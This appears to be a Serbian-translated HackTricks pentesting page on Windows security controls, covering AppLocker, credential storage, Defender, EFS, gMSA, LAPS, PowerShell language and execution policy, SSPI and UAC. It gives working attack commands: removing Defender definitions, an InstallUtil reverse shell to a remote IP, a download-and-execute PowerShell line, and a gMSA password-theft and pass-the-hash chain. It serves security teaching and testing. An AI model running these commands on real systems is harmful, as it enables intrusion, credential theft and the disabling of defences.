# Windows Security Controls

{{#include ../../banners/hacktricks-training.md}}

## AppLocker politika

Whitelist aplikacija je lista odobrenih softverskih aplikacija ili izvršnih datoteka kojima je dozvoljeno da budu prisutne i da se pokreću na sistemu. Cilj je zaštititi okruženje od štetnog malware-a i neodobrenog softvera koji nije u skladu sa specifičnim poslovnim potrebama organizacije.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoft-ovo **rešenje za whitelist aplikacija** i daje system administratorima kontrolu nad tim **koje aplikacije i datoteke korisnici mogu da pokreću**. Omogućava **granularnu kontrolu** nad izvršnim datotekama, skriptama, Windows installer datotekama, DLL datotekama, upakovanim aplikacijama i installerima upakovanih aplikacija.\
Uobičajeno je da organizacije **blokiraju cmd.exe i PowerShell.exe** i pristup za pisanje u određene direktorijume, **ali sve ovo može da se zaobiđe**.

### Provera

Proverite koje datoteke/ekstenzije su na blacklisti/whitelisti:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ova registry putanja sadrži konfiguracije i policies koje primenjuje AppLocker, pružajući način za pregled trenutnog skupa pravila koja se sprovode na sistemu:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Korisni **Writable folders** za zaobilaženje AppLocker Policy: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje **writable folders** koje možete koristiti da **zaobiđete ovo**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Često **pouzdani** [**"LOLBAS's"**](https://lolbas-project.github.io/) binarni fajlovi takođe mogu biti korisni za zaobilaženje AppLocker-a.
- **Loše napisane rules takođe mogu biti zaobiđene**
- Na primer, kod **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, možete kreirati **folder pod nazivom `allowed`** bilo gde i on će biti dozvoljen.
- Organizacije se takođe često fokusiraju na **blokiranje izvršnog fajla `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ali zaboravljaju na **druge lokacije PowerShell izvršnih fajlova** kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
- **DLL enforcement se veoma retko omogućava** zbog dodatnog opterećenja koje može izazvati na sistemu i količine testiranja potrebnog da bi se osiguralo da se ništa neće pokvariti. Zato će korišćenje **DLL-ova kao backdoor-a pomoći u zaobilaženju AppLocker-a**.
- Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) za **izvršavanje Powershell** koda u bilo kom procesu i zaobilaženje AppLocker-a. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Skladištenje akreditiva

### Security Accounts Manager (SAM)

Lokalni akreditivi se nalaze u ovom fajlu, a lozinke su hash-ovane.

### Local Security Authority (LSA) - LSASS

**Akreditivi** (hash-ovani) su **sačuvani** u **memoriji** ovog podsistema zbog Single Sign-On razloga.\
**LSA** administrira lokalnu **security policy** (policy lozinki, korisničke dozvole...), **authentication**, **access tokens**...\
LSA će proveravati **akreditive** unete u **SAM** fajlu (prilikom lokalnog prijavljivanja) i komunicirati sa **domain controller-om** radi autentifikacije korisnika domena.

**Akreditive** čuva **proces LSASS**: Kerberos tickete, NT i LM hash-eve, lako dešifrujuće lozinke.

### LSA secrets

LSA može sačuvati određene akreditive na disku:

- Lozinku računara u Active Directory-ju (nedostupni domain controller).
- Lozinke naloga Windows servisa
- Lozinke za scheduled tasks
- Ostalo (lozinke IIS aplikacija...)

### NTDS.dit

To je baza podataka Active Directory-ja. Prisutan je samo na Domain Controller-ima.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) je Antivirus koji je dostupan u Windows 10 i Windows 11, kao i u verzijama Windows Server-a. On **blokira** uobičajene pentesting alate kao što je **`WinPEAS`**. Međutim, postoje načini da se **zaobiđu ove zaštite**.

### Provera

Da biste proverili **status** programa **Defender**, možete izvršiti PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da biste saznali da li je aktivan):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Za njegovo enumerisanje možete takođe pokrenuti:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS štiti datoteke putem enkripcije, koristeći **simetrični ključ** poznat kao **File Encryption Key (FEK)**. Ovaj ključ se enkriptuje korisnikovim **javnim ključem** i čuva unutar **alternativnog toka podataka** $EFS enkriptovane datoteke. Kada je potrebna dekripcija, odgovarajući **privatni ključ** korisnikovog digitalnog sertifikata koristi se za dešifrovanje FEK-a iz $EFS toka. Više detalja možete pronaći [ovde](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariji dekripcije bez inicijative korisnika** uključuju:

- Kada se datoteke ili fascikle premeste na sistem datoteka koji ne podržava EFS, kao što je [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), one se automatski dešifruju.
- Enkriptovane datoteke poslate preko mreže putem SMB/CIFS protokola dešifruju se pre slanja.

Ovaj metod enkripcije omogućava vlasniku **transparentan pristup** enkriptovanim datotekama. Međutim, samo menjanje lozinke vlasnika i prijavljivanje neće omogućiti dekripciju.

**Najvažnije**:

- EFS koristi simetrični FEK, enkriptovan korisnikovim javnim ključem.
- Za dekripciju se koristi korisnikov privatni ključ radi pristupa FEK-u.
- Automatska dekripcija se vrši pod određenim uslovima, kao što su kopiranje na FAT32 ili mrežni prenos.
- Vlasnik može pristupiti enkriptovanim datotekama bez dodatnih koraka.

### Provera EFS informacija

Proverite da li je **korisnik** **koristio** ovaj **servis** tako što ćete proveriti da li ova putanja postoji:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Proverite **ko** ima **pristup** datoteci koristeći cipher /c \<file>\
Takođe možete koristiti `cipher /e` i `cipher /d` unutar fascikle da biste **enkriptovali** i **dešifrovali** sve datoteke

### Dekripcija EFS datoteka

#### Biti Authority System

Ovaj način zahteva da **victim user** ima **pokrenut** **proces** na hostu. Ako je to slučaj, korišćenjem `meterpreter` sesije možete imitirati token korisnikovog procesa (`impersonate_token` iz `incognito`). Ili možete jednostavno izvršiti `migrate` na proces korisnika.

#### Poznavanje korisničke lozinke


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft je razvio **Group Managed Service Accounts (gMSA)** kako bi pojednostavio upravljanje service account nalozima u IT infrastrukturama. Za razliku od tradicionalnih service account naloga kod kojih je često omogućena postavka "**Password never expire**", gMSA nalozi nude bezbednije rešenje kojim je lakše upravljati:

- **Automatsko upravljanje lozinkom**: gMSA koriste složenu lozinku od 240 karaktera koja se automatski menja u skladu sa pravilima domena ili računara. Ovim procesom upravlja Microsoft Key Distribution Service (KDC), čime se uklanja potreba za ručnim ažuriranjem lozinke.
- **Poboljšana bezbednost**: Ovi nalozi nisu podložni zaključavanju i ne mogu se koristiti za interaktivno prijavljivanje, čime se poboljšava njihova bezbednost.
- **Podrška za više hostova**: gMSA nalozi mogu da se dele između više hostova, što ih čini idealnim za servise koji rade na više servera.
- **Mogućnost korišćenja Scheduled Task**: Za razliku od managed service account naloga, gMSA podržavaju pokretanje zakazanih zadataka.
- **Pojednostavljeno SPN upravljanje**: Sistem automatski ažurira Service Principal Name (SPN) kada dođe do promena u sAMaccount detaljima računara ili DNS imenu, čime se pojednostavljuje SPN upravljanje.

Lozinke za gMSA naloge čuvaju se u LDAP svojstvu _**msDS-ManagedPassword**_ i Domain Controllers (DCs) ih automatski resetuju svakih 30 dana. Ova lozinka, enkriptovani data blob poznat kao [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), može se preuzeti samo od strane ovlašćenih administratora i servera na kojima su gMSA nalozi instalirani, čime se obezbeđuje bezbedno okruženje. Za pristup ovim informacijama potrebna je bezbedna veza kao što je LDAPS ili veza mora biti autentifikovana uz 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Ovu lozinku možete pročitati pomoću alata [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pronađite više informacija u ovoj objavi**](https://cube0x0.github.io/Relaying-for-gMSA/)

Takođe pogledajte ovu [web stranicu](https://cube0x0.github.io/Relaying-for-gMSA/) o tome kako izvršiti **NTLM relay attack** za **čitanje** **password-a** za **gMSA**.<sup>[[1]](#references)</sup>

### Zloupotreba ACL chaining-a za čitanje gMSA managed password-a (GenericAll -> ReadGMSAPassword)

U mnogim okruženjima korisnici sa niskim privilegijama mogu doći do gMSA tajni bez kompromitovanja DC-a, zloupotrebom pogrešno konfigurisanih ACL-ova objekata:<sup>[[3]](#references)</sup>

- Grupi koju možete kontrolisati (npr. putem GenericAll/GenericWrite) dodeljen je `ReadGMSAPassword` nad gMSA nalogom.
- Dodavanjem sebe u tu grupu nasleđujete pravo da čitate `msDS-ManagedPassword` blob za gMSA preko LDAP-a i izvedete upotrebljive NTLM kredencijale.

Tipičan tok rada:

1) Otkrivanje putanje pomoću BloodHound-a i označavanje vaših foothold principala kao Owned. Potražite veze poput:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Dodajte sebe u posredničku grupu koju kontrolišete (primer sa bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Pročitajte upravljanu lozinku gMSA putem LDAP-a i izvedite NTLM hash. NetExec automatizuje izdvajanje `msDS-ManagedPassword` i konverziju u NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Autentifikujte se kao gMSA koristeći NTLM hash (plaintext nije potreban). Ako se nalog nalazi u grupi Remote Management Users, WinRM će raditi direktno:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Napomene:
- LDAP čitanja atributa `msDS-ManagedPassword` zahtevaju sealing (npr. LDAPS/sign+seal). Tools to automatski obrađuju.
- gMSAs-u se često dodeljuju lokalna prava kao što je WinRM; proverite članstvo u grupama (npr. Remote Management Users) da biste planirali lateral movement.
- Ako vam je potreban samo blob za samostalno izračunavanje NTLM-a, pogledajte strukturu MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

**Local Administrator Password Solution (LAPS)**, dostupno za preuzimanje sa [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), omogućava upravljanje lozinkama lokalnog Administrator naloga. Ove lozinke, koje su **randomizovane**, jedinstvene i **redovno menjane**, centralno se čuvaju u Active Directory-ju. Pristup ovim lozinkama ograničen je pomoću ACL-ova na ovlašćene korisnike. Kada su dodeljene dovoljne dozvole, omogućeno je čitanje lozinki lokalnog administratora.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ograničava mnoge funkcije** potrebne za efikasno korišćenje PowerShell-a, kao što su blokiranje COM objekata, dozvoljavanje samo odobrenih .NET tipova, workflow-ova zasnovanih na XAML-u, PowerShell klasa i drugo.

### **Provera**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
U aktuelnim verzijama Windows-a ovaj Bypass neće raditi, ali možete koristiti[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Za kompajliranje možda ćete morati** **da** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> dodate `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.

#### Direktni bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Execution Policy

Podrazumevano je podešena na **restricted.** Glavni načini za zaobilaženje ove politike:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Više informacija možete pronaći [ovde](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Interfejs dobavljača bezbednosne podrške (SSPI)

To je API koji se može koristiti za autentifikaciju korisnika.

SSPI je zadužen za pronalaženje odgovarajućeg protokola za dve mašine koje žele da komuniciraju. Preferirani metod za ovo je Kerberos. Zatim SSPI pregovara o tome koji će se authentication protocol koristiti. Ovi authentication protocols nazivaju se Security Support Provider (SSP), nalaze se unutar svake Windows mašine u obliku DLL datoteke i obe mašine moraju da podržavaju isti protokol da bi mogle da komuniciraju.

### Glavni SSP-ovi

- **Kerberos**: Preferirani
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Zbog kompatibilnosti
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web serveri i LDAP, lozinka u obliku MD5 hash-a
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Koristi se za pregovaranje o protokolu koji će se koristiti (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
- %windir%\Windows\System32\lsasrv.dll

#### Pregovaranje može ponuditi više metoda ili samo jednu.

## UAC - Kontrola korisničkog naloga

[Kontrola korisničkog naloga (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za potvrdu aktivnosti sa povišenim privilegijama**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Reference

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA putem ulančavanja prava do WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Zaobilaženje AppLocker-a i PowerShell Constrained Language Mode-a](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 načina za zaobilaženje PowerShell Execution Policy-ja](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ dešifrovanje EFS datoteka](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
